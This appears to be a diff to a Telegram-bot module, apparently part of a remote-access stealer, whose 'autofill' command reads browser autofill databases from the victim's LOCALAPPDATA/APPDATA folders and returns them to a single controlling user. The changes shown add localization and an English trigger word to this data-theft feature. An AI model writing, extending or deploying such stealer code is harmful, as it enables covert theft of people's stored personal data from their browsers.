@@ -26,8 +26,10 @@ from config import ALLOWED_USER_ID
 
 import tempfile
 import os
-import shutil
+import shutil 
 import sqlite3
+from lib.text.texts import TEXTS, user_languages
+
 
 LOCAL = os.getenv("LOCALAPPDATA")
 APPDATA = os.getenv("APPDATA")
@@ -39,9 +41,12 @@ PATHS = {
 }
 
 def register_autofill_handler(dp):
-    @dp.message(F.text.lower() == "автозаполнения браузера [new]")
+    @dp.message((F.text.lower() == "автозаполнения браузера") | (F.text.lower() == "autofill"))
     @dp.message(Command("autofill"))
     async def autofill(message: types.Message):
+        user_id = message.from_user.id
+        lang = user_languages.get(user_id, 'ru')
+
         if message.from_user.id == ALLOWED_USER_ID:
             res = []
             for browser, base in PATHS.items():
@@ -120,4 +125,4 @@ def register_autofill_handler(dp):
                     if tmp_file_path and os.path.exists(tmp_file_path):
                         os.remove(tmp_file_path)
         else:
-            await message.answer("К сожалению, у вас нет доступа к этому боту.")
+            await message.answer(TEXTS[lang]['no_access'])
